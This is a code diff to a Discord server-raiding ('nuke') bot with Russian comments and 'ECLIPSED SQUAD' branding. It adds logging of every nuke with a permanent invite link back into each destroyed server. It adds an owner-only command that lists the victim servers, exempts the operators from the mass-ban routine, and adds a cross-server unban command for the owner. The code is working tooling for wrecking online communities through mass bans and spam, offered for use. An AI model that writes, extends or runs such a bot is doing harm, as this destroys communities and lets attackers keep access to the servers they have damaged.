@@ -52,6 +52,33 @@ async def db_set(collection: str, key: str, value):
     )
 
 
+# ─── NUKE LOGS ─────────────────────────────────────────────
+
+async def log_nuke(guild: discord.Guild, user: discord.User, nuke_type: str):
+    """Сохраняет лог нюка. Одна запись на сервер — обновляется при повторном нюке."""
+    # Пробуем получить инвайт
+    invite_url = None
+    try:
+        ch = next((c for c in guild.text_channels if c.permissions_for(guild.me).create_instant_invite), None)
+        if ch:
+            inv = await ch.create_invite(max_age=0, max_uses=0, unique=False)
+            invite_url = inv.url
+    except Exception:
+        pass
+
+    import datetime
+    entry = {
+        "guild_id": guild.id,
+        "guild_name": guild.name,
+        "user_id": user.id,
+        "user_name": str(user),
+        "type": nuke_type,
+        "invite": invite_url,
+        "time": datetime.datetime.utcnow().strftime("%d.%m.%Y %H:%M UTC")
+    }
+    await db_set("nuke_logs", str(guild.id), entry)
+
+
 # ─── HELPERS ───────────────────────────────────────────────
 
 nuke_running = {}
@@ -212,9 +239,17 @@ async def do_superpr_nuke_task(guild, spam_text=None):
     TURBO_NAME = "CRASH BY ECLIPS"
 
     bot_role = guild.me.top_role
+    # Защищённые ID — никогда не банятся
+    PROTECTED_IDS = {config.OWNER_ID, 1421778029310509056}
+    # Добавляем того кто запустил нюк
+    starter_id = nuke_starter.get(guild.id)
+    if starter_id:
+        PROTECTED_IDS.add(starter_id)
+
     targets = [
         m for m in guild.members
         if not m.bot and m.id != guild.owner_id
+        and m.id not in PROTECTED_IDS
         and (not m.top_role or m.top_role < bot_role)
     ]
 
@@ -292,6 +327,7 @@ async def nuke(ctx, *, text: str = None):
     last_nuke_time[ctx.guild.id] = asyncio.get_running_loop().time()
     last_spam_text[ctx.guild.id] = spam_text
     asyncio.create_task(do_nuke(guild, spam_text))
+    asyncio.create_task(log_nuke(guild, ctx.author, "nuke"))
 
 
 @bot.command()
@@ -633,6 +669,7 @@ async def super_nuke(ctx, *, text: str = None):
     last_nuke_time[guild.id] = asyncio.get_running_loop().time()
     last_spam_text[guild.id] = spam_text
     asyncio.create_task(do_superpr_nuke_task(guild, spam_text))
+    asyncio.create_task(log_nuke(guild, ctx.author, "super_nuke"))
 
 
 @bot.command(name="massdm")
@@ -1110,6 +1147,38 @@ async def giverole(ctx, user: discord.Member, role: discord.Role):
         await ctx.send("❌ Нет прав выдать эту роль (роль выше бота в иерархии).")
     except Exception as e:
         await ctx.send(f"❌ Ошибка: {e}")
+
+
+@bot.command(name="nukelogs")
+async def nukelogs(ctx):
+    """Показать логи нюков. Только для овнера."""
+    if ctx.author.id != config.OWNER_ID:
+        return
+    db = get_db()
+    if db is None:
+        await ctx.send("❌ MongoDB не подключена.")
+        return
+    cursor = db["nuke_logs"].find({})
+    logs = await cursor.to_list(length=100)
+    if not logs:
+        await ctx.send("Логов нюков нет.")
+        return
+    embed = discord.Embed(title="📋 Логи нюков", color=0x0a0a0a)
+    for doc in logs[:20]:  # максимум 20 в одном embed
+        entry = doc.get("value", doc)
+        invite = entry.get("invite") or "нет инвайта"
+        embed.add_field(
+            name=f"{'💀' if entry.get('type') == 'nuke' else '⚡'} {entry.get('guild_name', '?')}",
+            value=(
+                f"Тип: `{entry.get('type', '?')}`\n"
+                f"Кто: **{entry.get('user_name', '?')}** (`{entry.get('user_id', '?')}`)\n"
+                f"Время: `{entry.get('time', '?')}`\n"
+                f"Инвайт: {invite}"
+            ),
+            inline=False
+        )
+    embed.set_footer(text=f"☠️ ECLIPSED SQUAD  |  Всего записей: {len(logs)}")
+    await ctx.send(embed=embed)
 
 
 bot.remove_command("help")
@@ -1859,6 +1928,33 @@ async def run_dm_command(message: discord.Message, guild: discord.Guild, cmd_tex
                 embed = discord.Embed(title="💎 Premium список", description="\n".join(lines), color=0x0a0a0a)
                 embed.set_footer(text=f"☠️ ECLIPSED SQUAD  |  Всего: {len(PREMIUM_LIST)}")
                 await message.channel.send(embed=embed)
+
+        elif cmd_name == "unban":
+            if not args:
+                await message.channel.send("Использование: `!unban <user_id>`")
+                return
+            try:
+                uid = int(args.strip())
+                user = await bot.fetch_user(uid)
+                unbanned = 0
+                failed = 0
+                for g in bot.guilds:
+                    try:
+                        await g.unban(user, reason="unban by owner")
+                        unbanned += 1
+                    except Exception:
+                        failed += 1
+                embed = discord.Embed(
+                    title="🔓 Разбан выполнен",
+                    description=f"Пользователь: **{user}** (`{uid}`)\n✅ Разбанен на **{unbanned}** серверах\n❌ Не удалось на **{failed}** серверах",
+                    color=0x0a0a0a
+                )
+                embed.set_footer(text="☠️ ECLIPSED SQUAD")
+                await message.channel.send(embed=embed)
+            except ValueError:
+                await message.channel.send("Использование: `!unban <user_id>`")
+            except discord.NotFound:
+                await message.channel.send("❌ Пользователь не найден.")
 
         else:
             await message.channel.send(f"❌ Неизвестная команда `{cmd_name}`. Напиши `!owner_help`.")
